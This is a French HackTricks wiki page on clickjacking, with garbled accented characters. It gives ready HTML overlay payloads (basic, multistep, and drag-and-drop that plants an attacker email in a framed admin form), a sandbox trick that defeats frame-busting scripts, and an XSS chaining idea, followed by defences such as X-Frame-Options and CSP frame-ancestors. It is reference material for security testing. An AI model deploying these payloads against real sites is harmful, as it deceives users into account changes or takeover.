# Clickjacking

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des flux de travail** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Qu'est-ce que le Clickjacking

Dans une attaque de clickjacking, un **utilisateur** est **tromp√©** pour **cliquer** sur un **√©l√©ment** d'une page web qui est soit **invisible** soit d√©guis√© en un autre √©l√©ment. Cette manipulation peut entra√Æner des cons√©quences non intentionnelles pour l'utilisateur, telles que le t√©l√©chargement de logiciels malveillants, la redirection vers des pages web malveillantes, la fourniture d'identifiants ou d'informations sensibles, des transferts d'argent ou l'achat en ligne de produits.

### Astuce de pr√©remplissage de formulaires

Parfois, il est possible de **remplir la valeur des champs d'un formulaire en utilisant des param√®tres GET lors du chargement d'une page**. Un attaquant peut abuser de ce comportement pour remplir un formulaire avec des donn√©es arbitraires et envoyer la charge utile de clickjacking afin que l'utilisateur appuie sur le bouton Soumettre.

### Remplir un formulaire avec le glisser-d√©poser

Si vous avez besoin que l'utilisateur **remplisse un formulaire** mais que vous ne voulez pas lui demander directement d'√©crire des informations sp√©cifiques (comme l'e-mail et/ou le mot de passe sp√©cifique que vous connaissez), vous pouvez simplement lui demander de **glisser-d√©poser** quelque chose qui √©crira vos donn√©es contr√¥l√©es comme dans [**cet exemple**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Charge utile de base
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Charge utile multistep
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Payload Drag\&Drop + Clic

#### English
```markdown
1. **Drag\&Drop + Click payload**: This technique involves creating a hidden iframe that covers the entire page or a specific element. The attacker then tricks the user into dragging and dropping a seemingly harmless object (e.g., an image) onto the hidden iframe. When the user tries to click on the object, they are actually clicking on a button or link that performs a malicious action, such as transferring funds or changing account settings.
```

#### French
```markdown
1. **Payload Drag\&Drop + Clic**: Cette technique consiste √† cr√©er un iframe cach√© qui recouvre l'ensemble de la page ou un √©l√©ment sp√©cifique. L'attaquant trompe ensuite l'utilisateur en le faisant glisser et d√©poser un objet en apparence inoffensif (par exemple, une image) sur l'iframe cach√©. Lorsque l'utilisateur essaie de cliquer sur l'objet, il clique en r√©alit√© sur un bouton ou un lien qui ex√©cute une action malveillante, telle que le transfert de fonds ou la modification des param√®tres du compte.
```
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Si vous avez identifi√© une attaque **XSS qui n√©cessite qu'un utilisateur clique** sur un √©l√©ment pour **d√©clencher** le XSS et que la page est **vuln√©rable au clickjacking**, vous pourriez l'exploiter pour tromper l'utilisateur en le faisant cliquer sur le bouton/lien.\
Exemple:\
_Vous avez trouv√© un **auto-XSS** dans certains d√©tails priv√©s du compte (d√©tails que **seul vous pouvez d√©finir et lire**). La page avec le **formulaire** pour d√©finir ces d√©tails est **vuln√©rable** au **clickjacking** et vous pouvez **pr√©-remplir** le **formulaire** avec les param√®tres GET._\
\_\_Un attaquant pourrait pr√©parer une attaque de **clickjacking** sur cette page en **pr√©-remplissant** le **formulaire** avec la **charge utile XSS** et en **trompant** l'**utilisateur** pour **soumettre** le formulaire. Ainsi, **lorsque le formulaire est soumis** et que les valeurs sont modifi√©es, l'**utilisateur ex√©cutera le XSS**.

## Strat√©gies pour Mitiger le Clickjacking

### D√©fenses C√¥t√© Client

Les scripts ex√©cut√©s c√¥t√© client peuvent effectuer des actions pour pr√©venir le Clickjacking :

* S'assurer que la fen√™tre de l'application est la fen√™tre principale ou sup√©rieure.
* Rendre tous les cadres visibles.
* Emp√™cher les clics sur les cadres invisibles.
* D√©tecter et alerter les utilisateurs sur les tentatives potentielles de Clickjacking.

Cependant, ces scripts de rupture de cadre peuvent √™tre contourn√©s :

* **Param√®tres de S√©curit√© des Navigateurs :** Certains navigateurs peuvent bloquer ces scripts en fonction de leurs param√®tres de s√©curit√© ou du manque de support JavaScript.
* **Attribut `sandbox` de l'iframe HTML5 :** Un attaquant peut neutraliser les scripts de rupture de cadre en d√©finissant l'attribut `sandbox` avec les valeurs `allow-forms` ou `allow-scripts` sans `allow-top-navigation`. Cela emp√™che l'iframe de v√©rifier s'il est la fen√™tre sup√©rieure, par exemple.
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
Les valeurs `allow-forms` et `allow-scripts` permettent des actions dans l'iframe tout en d√©sactivant la navigation de niveau sup√©rieur. Pour garantir la fonctionnalit√© pr√©vue du site cibl√©, des autorisations suppl√©mentaires telles que `allow-same-origin` et `allow-modals` peuvent √™tre n√©cessaires, selon le type d'attaque. Les messages de la console du navigateur peuvent indiquer quelles autorisations autoriser.

### D√©fenses c√¥t√© serveur

#### X-Frame-Options

L'en-t√™te de r√©ponse HTTP **`X-Frame-Options`** informe les navigateurs sur la l√©gitimit√© du rendu d'une page dans un `<frame>` ou `<iframe>`, aidant √† pr√©venir le Clickjacking :

- `X-Frame-Options: deny` - Aucun domaine ne peut encadrer le contenu.
- `X-Frame-Options: sameorigin` - Seul le site actuel peut encadrer le contenu.
- `X-Frame-Options: allow-from https://trusted.com` - Seul l'URI sp√©cifi√© peut encadrer la page.
- Notez les limitations : si le navigateur ne prend pas en charge cette directive, cela pourrait ne pas fonctionner. Certains navigateurs pr√©f√®rent la directive CSP frame-ancestors.

#### Directive frame-ancestors de la strat√©gie de s√©curit√© du contenu (CSP)

La directive **`frame-ancestors` dans CSP** est la m√©thode recommand√©e pour la protection contre le Clickjacking :

- `frame-ancestors 'none'` - Similaire √† `X-Frame-Options: deny`.
- `frame-ancestors 'self'` - Similaire √† `X-Frame-Options: sameorigin`.
- `frame-ancestors trusted.com` - Similaire √† `X-Frame-Options: allow-from`.

Par exemple, la CSP suivante autorise uniquement l'encadrement √† partir du m√™me domaine :

`Content-Security-Policy: frame-ancestors 'self';`

Des d√©tails suppl√©mentaires et des exemples complexes peuvent √™tre trouv√©s dans la [documentation de la CSP frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) et dans la [documentation de Mozilla sur la CSP frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Politique de s√©curit√© du contenu (CSP) avec `child-src` et `frame-src`

La **Politique de s√©curit√© du contenu (CSP)** est une mesure de s√©curit√© qui aide √† pr√©venir le Clickjacking et d'autres attaques par injection de code en sp√©cifiant les sources que le navigateur devrait autoriser √† charger du contenu.

#### Directive `frame-src`

- D√©finit les sources valides pour les frames.
- Plus sp√©cifique que la directive `default-src`.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Ce param√®tre autorise les frames de la m√™me origine (self) et https://trusted-website.com.

#### Directive `child-src`

* Introduit dans CSP niveau 2 pour d√©finir les sources valides pour les web workers et les frames.
* Agit comme une solution de secours pour frame-src et worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Cette politique permet les frames et les workers de la m√™me origine (self) et de https://trusted-website.com.

**Notes d'utilisation:**

* Obsolescence: child-src est progressivement remplac√© par frame-src et worker-src.
* Comportement de secours: Si frame-src est absent, child-src est utilis√© comme secours pour les frames. Si les deux sont absents, default-src est utilis√©.
* D√©finition stricte de la source: Inclure uniquement des sources de confiance dans les directives pour √©viter l'exploitation.

#### Scripts JavaScript de rupture de frame

Bien que pas totalement infaillibles, des scripts de rupture de frame bas√©s sur JavaScript peuvent √™tre utilis√©s pour emp√™cher une page web d'√™tre encadr√©e. Exemple:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Utilisation des jetons anti-CSRF

* **Validation du jeton :** Utilisez des jetons anti-CSRF dans les applications web pour garantir que les requ√™tes modifiant l'√©tat sont effectu√©es intentionnellement par l'utilisateur et non via une page Clickjacked.

## R√©f√©rences

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des workflows** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
